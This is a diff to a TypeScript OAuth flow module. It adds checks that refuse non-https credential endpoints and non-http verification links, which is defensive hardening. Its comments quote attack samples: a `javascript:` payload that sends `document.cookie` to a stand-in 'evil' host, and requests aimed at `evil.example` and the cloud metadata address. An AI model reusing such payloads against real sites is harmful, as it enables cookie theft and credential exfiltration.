@@ -14,7 +14,7 @@
  * this tool is most useful.
  */
 
-import { AuthError, ErrorCode } from '@openref/core';
+import { AuthError, ErrorCode, isHttpUrl, isSecureCredentialUrl } from '@openref/core';
 import { formEncode } from '../../request/domain/body';
 import type {
   OAuthFlowKind,
@@ -162,6 +162,12 @@ export function authorizationUrl(
       { flow: flow.kind },
     );
   }
+
+  // THE ONE ADDRESS A READER IS NAVIGATED TO RATHER THAN FETCHED FROM, which is why the refusal
+  // matters more here than on the four beside it: a `fetch` to a strange scheme fails, and a
+  // navigation to one hands the reader's browser whatever the document wrote. Measured before this
+  // call existed, `javascript:` and `data:` were both built without a word.
+  secureFlowUrl(base, 'authorization url', flow.kind);
 
   const implicit = flow.kind === 'implicit';
 
@@ -456,7 +462,7 @@ export function refreshPlan(
     );
   }
 
-  return tokenPlan(url, client, [
+  return tokenPlan(secureFlowUrl(url, 'token url', flow.kind), client, [
     ['grant_type', 'refresh_token'],
     ['refresh_token', refreshToken],
     ['scope', scopeOf(flow, client)],
@@ -485,7 +491,9 @@ export function deviceAuthorizationPlan(flow: RunnableOAuthFlow, client: OAuthCl
     );
   }
 
-  return tokenPlan(url, client, [['scope', scopeOf(flow, client)]]);
+  const deviceUrl = secureFlowUrl(url, 'device authorization url', flow.kind);
+
+  return tokenPlan(deviceUrl, client, [['scope', scopeOf(flow, client)]]);
 }
 
 /**
@@ -511,6 +519,88 @@ export function devicePollPlan(
   ]);
 }
 
+/**
+ * Refuses an address a flow would send a credential to, or navigate a reader to.
+ *
+ * PER SPEC 14.4, AND IT ASKS THE QUESTION OF EVERY ADDRESS RATHER THAN OF THE DISCOVERED ONES.
+ * `discovery.ts` has always refused an endpoint that is not https or loopback, and a flow the
+ * OpenAPI document declared went straight past it: measured before this existed, a
+ * `clientCredentials` request to `http://evil.example/token` was built carrying the client secret
+ * in a `Basic` header, and a code exchange to `http://169.254.169.254/token` carrying the PKCE
+ * verifier. The predicate is `core`'s, so the two paths cannot come to disagree about what secure
+ * means.
+ *
+ * @param url - The address as the document or the server wrote it
+ * @param what - Which address it is, for the refusal
+ * @param flow - The flow it belongs to, for the refusal
+ * @returns The url, unchanged, when it may be used
+ *
+ * @throws {AuthError} When it is not an absolute https url, loopback http aside
+ */
+/**
+ * Refuses a verification address the reader could not safely be sent to.
+ *
+ * `http` and `https` and nothing else. This value is not a credential path, so it does not take
+ * the https rule the flow's own addresses take: a device verification page on a plain http host is
+ * a real arrangement. What it may not be is a scheme that hands the reader's operating system
+ * something, which is what an unfiltered value in an `href` does.
+ *
+ * @param value - The address the authorization server returned
+ * @param field - Which field it came from, for the refusal
+ * @param status - Response status, for the refusal context
+ *
+ * @throws {AuthError} When the address names a scheme a reader must not be handed
+ */
+function assertVerificationUri(value: string, field: string, status: number): void {
+  let parsed: URL;
+  try {
+    parsed = new URL(value);
+  } catch {
+    throw new AuthError(
+      `the device authorization endpoint's ${field} is not an absolute url`,
+      ErrorCode.RUN_AUTH_FAILED,
+      undefined,
+      { status, field, value },
+    );
+  }
+
+  if (!isHttpUrl(parsed)) {
+    throw new AuthError(
+      `the device authorization endpoint's ${field} names the scheme ` +
+        `${parsed.protocol.replace(':', '')}, and the reader is only ever sent to http or https`,
+      ErrorCode.RUN_AUTH_FAILED,
+      undefined,
+      { status, field, value },
+    );
+  }
+}
+
+function secureFlowUrl(url: string, what: string, flow: string): string {
+  let parsed: URL;
+  try {
+    parsed = new URL(url);
+  } catch {
+    throw new AuthError(
+      `the ${flow} flow's ${what} is not an absolute url, so there is nowhere to send anything`,
+      ErrorCode.RUN_AUTH_FAILED,
+      undefined,
+      { flow, what, url },
+    );
+  }
+
+  if (!isSecureCredentialUrl(parsed)) {
+    throw new AuthError(
+      `the ${flow} flow's ${what} is ${parsed.protocol.replace(':', '')} rather than https, and a ` +
+        'credential is not sent over it. Only a loopback host is admitted without https',
+      ErrorCode.RUN_AUTH_FAILED,
+      undefined,
+      { flow, what, url },
+    );
+  }
+
+  return url;
+}
+
 function tokenUrlOf(flow: RunnableOAuthFlow): string {
   const url = flow.tokenUrl ?? '';
   if (url === '') {
@@ -522,7 +612,7 @@ function tokenUrlOf(flow: RunnableOAuthFlow): string {
     );
   }
 
-  return url;
+  return secureFlowUrl(url, 'token url', flow.kind);
 }
 
 function asRecord(body: string): Record<string, unknown> | null {
@@ -742,6 +832,19 @@ export function parseDeviceAuthorization(status: number, body: string): DeviceAu
   }
 
   const complete = stringField(record, 'verification_uri_complete');
+
+  // THE ONE VALUE HERE THAT BECOMES AN href, SO IT IS FILTERED WHERE IT IS PARSED RATHER THAN
+  // WHERE IT IS DRAWN. Found by the pre-M4 review: the second reference theme bound
+  // `verification_uri_complete` straight into an anchor while the default theme printed it as
+  // text, which is the shape of two surfaces answering a question nobody asked. Measured through
+  // this parser, `javascript:fetch("//evil/"+document.cookie)` reached that href with the anchor
+  // text showing a plausible `https` address beside it, so the link was spoofed as well as
+  // unfiltered. Refused here, once, so no theme has to remember: a device flow whose verification
+  // address a reader cannot open is a flow that cannot be completed, and saying so is the answer.
+  assertVerificationUri(verificationUri, 'verification_uri', status);
+  if (complete !== undefined) {
+    assertVerificationUri(complete, 'verification_uri_complete', status);
+  }
 
   return {
     deviceCode,
